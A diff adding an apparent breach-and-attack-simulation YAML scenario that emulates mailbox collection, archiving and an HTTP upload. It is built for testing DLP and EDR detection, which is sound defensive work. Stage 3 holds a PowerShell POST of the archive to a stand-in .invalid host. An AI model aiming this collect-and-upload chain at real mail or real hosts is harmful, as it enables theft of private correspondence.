@@ -1,0 +1,161 @@
+id: collection-email-mailbox-exfil
+product_line: dlp
+name: Local Mailbox Collection and Outbound Probe
+description: >
+  Telemetry-safe emulation of an adversary collecting a local mailbox export,
+  archiving it, and sending it out. Mail is synthetic: three .eml messages with
+  [BAS-SIM] sender, recipient and body text are generated at run time. No mail
+  client, mail store, or account is contacted. The chain covers collection from
+  the mailbox, which dlp-exfiltration-smtp does not cover. That scenario tests
+  attachments sent over SMTP.
+
+  KILL CHAIN STAGES:
+    1. Local Mailbox Collection — write a synthetic mailbox export of .eml messages (T1114.001)
+    2. Mailbox Archive         — compress the export (T1560.001)
+    3. Mailbox Upload Attempt  — POST the archive to an RFC-6761 .invalid host (T1048.003)
+
+  SAFETY: Every message is synthetic and tagged [BAS-SIM]. No Outlook, PST, OST,
+  Exchange, or other mail store is read. The destination is a .invalid host that
+  cannot resolve. Files are deleted in cleanup. Windows only. Telemetry mode.
+author: Audspect Research
+executable: true
+local_check: false
+supported_os: [windows]
+tags:
+  - collection
+  - email
+  - mailbox
+  - exfiltration
+  - dlp
+  - t1114
+  - t1560
+  - t1048
+  - mitre
+mitre_phases:
+  - collection
+  - exfiltration
+
+live_policy:
+  block_on_domain_controller: true
+  require_dc_reachable: false
+  max_spray_attempts: 0
+  spray_account_allowlist: []
+  execution_window: ""
+
+steps:
+
+  # ---------------------------------------------------------------------------
+  # Stage 1 — Local Mailbox Collection (T1114.001)
+  # ---------------------------------------------------------------------------
+  - name: "Mailbox Exfil 1 — Synthetic Local Mailbox Export (T1114.001)"
+    technique_id: T1114.001
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 30
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    reversible: true
+    blast_radius: "Writes three synthetic .eml messages into a per-run folder under %TEMP%\\bas_mail_<runid>. The messages use .invalid addresses and [BAS-SIM] text. No mail store, PST, OST, or account is read."
+    telemetry:
+      - "Sysmon EID 11: .eml files created under %TEMP%\\bas_mail_<runid>"
+    detection:
+      - "DLP/EDR: bulk export of mail-format files from a user profile, outside any mail client"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $runId = if ($env:BAS_RUN_ID) { $env:BAS_RUN_ID.Substring(0,[Math]::Min(8,$env:BAS_RUN_ID.Length)) } else { '{0:x8}' -f (Get-Random -Maximum 0x7FFFFFFF) }
+      $work = Join-Path $env:TEMP "bas_mail_$runId"
+      New-Item -ItemType Directory -Path $work -Force | Out-Null
+      foreach ($i in 1..3) {
+        $eml = @(
+          "From: bas-sim-sender-$i@bas-sim.invalid",
+          "To: bas-sim-recipient@bas-sim.invalid",
+          "Subject: [BAS-SIM] synthetic message $i",
+          "Date: Wed, 18 Nov 2026 09:00:00 +0530",
+          "",
+          "[BAS-SIM] synthetic mailbox content $i. No real correspondence."
+        ) -join "`r`n"
+        Set-Content -Path (Join-Path $work ("message_{0:d2}.eml" -f $i)) -Value $eml -Encoding UTF8
+      }
+      $count = @(Get-ChildItem -Path $work -Filter '*.eml').Count
+      Write-Output "EXEC T1114.001: exported $count synthetic .eml message(s) to $work. No mail store was read. Mailbox Stage 1. [BAS-SIM-MBX-S1]"
+      Write-Output "FAIL: A bulk mailbox export was written to a temp folder with no alert. Mailbox collection outside a mail client is a DLP and EDR signal."
+    cleanup: ""
+
+  # ---------------------------------------------------------------------------
+  # Stage 2 — Mailbox Archive (T1560.001)
+  # ---------------------------------------------------------------------------
+  - name: "Mailbox Exfil 2 — Archive of the Mailbox Export (T1560.001)"
+    technique_id: T1560.001
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 30
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    reversible: true
+    blast_radius: "Compresses the synthetic .eml messages from Stage 1 into a zip with Compress-Archive, in the same per-run folder. Nothing leaves the host in this stage."
+    telemetry:
+      - "Sysmon EID 1: powershell.exe with Compress-Archive"
+      - "Sysmon EID 11: mailbox.zip created"
+    detection:
+      - "EDR: archive of fresh mail-format files — pre-exfil staging IOC"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $runId = if ($env:BAS_RUN_ID) { $env:BAS_RUN_ID.Substring(0,[Math]::Min(8,$env:BAS_RUN_ID.Length)) } else { '{0:x8}' -f (Get-Random -Maximum 0x7FFFFFFF) }
+      $work = Join-Path $env:TEMP "bas_mail_$runId"
+      $msgs = @(Get-ChildItem -Path $work -Filter '*.eml' -ErrorAction SilentlyContinue)
+      if ($msgs.Count -eq 0) {
+        Write-Output "SKIP: T1560.001: no mailbox export from Stage 1 to archive. [BAS-SIM-MBX-S2]"
+        exit 0
+      }
+      $zip = Join-Path $work 'mailbox.zip'
+      Compress-Archive -Path (Join-Path $work '*.eml') -DestinationPath $zip -Force
+      $size = (Get-Item $zip).Length
+      Write-Output "EXEC T1560.001: archived $($msgs.Count) synthetic message(s) to $zip ($size bytes). Mailbox Stage 2. [BAS-SIM-MBX-S2]"
+      Write-Output "FAIL: A mailbox export was archived with no alert. Archiving a mail export is the step that prepares it for transfer."
+    cleanup: ""
+
+  # ---------------------------------------------------------------------------
+  # Stage 3 — Mailbox Upload Attempt (T1048.003)
+  # ---------------------------------------------------------------------------
+  - name: "Mailbox Exfil 3 — Mailbox Archive Upload Attempt to .invalid (T1048.003)"
+    technique_id: T1048.003
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 30
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    reversible: true
+    blast_radius: "POSTs the synthetic mailbox archive from Stage 2 to an RFC-6761 .invalid host over HTTP. The host cannot resolve, so nothing leaves the host. Generates Sysmon EID 22 and EID 3."
+    telemetry:
+      - "Sysmon EID 22: DNS query for the bas-sim .invalid host"
+      - "Proxy/egress log: POST of a mailbox-shaped archive"
+    detection:
+      - "DLP: mailbox archive uploaded to an unknown host — exfil block expected"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $runId = if ($env:BAS_RUN_ID) { $env:BAS_RUN_ID.Substring(0,[Math]::Min(8,$env:BAS_RUN_ID.Length)) } else { '{0:x8}' -f (Get-Random -Maximum 0x7FFFFFFF) }
+      $zip = Join-Path $env:TEMP "bas_mail_$runId\mailbox.zip"
+      if (-not (Test-Path $zip)) {
+        Write-Output "SKIP: T1048.003: no mailbox archive from Stage 2 to send. [BAS-SIM-MBX-S3]"
+        exit 0
+      }
+      $target = "http://bas-sim-mail-$runId.invalid/upload"
+      $reached = $false
+      try {
+        $r = Invoke-WebRequest -Uri $target -Method Post -InFile $zip -ContentType 'application/zip' -TimeoutSec 10 -UseBasicParsing
+        if ($r.StatusCode) { $reached = $true }
+      } catch { $reached = $false }
+      Write-Output "EXEC T1048.003: attempted HTTP POST of the synthetic mailbox archive to $target. reached=$reached (expected: false). Mailbox upload Stage 3. [BAS-SIM-MBX-S3]"
+      if ($reached) {
+        Write-Output "FAIL: A mailbox archive was delivered to an unknown host. Egress and DLP are not stopping mail collected outside a mail client."
+      } else {
+        Write-Output "FAIL: The endpoint attempted to send a mailbox archive to an unknown host. Unreachable only because the domain is .invalid; the attempt is the signal DLP should alert on."
+      }
+    cleanup: |
+      Remove-Item (Join-Path $env:TEMP 'bas_mail_*') -Recurse -Force -ErrorAction SilentlyContinue
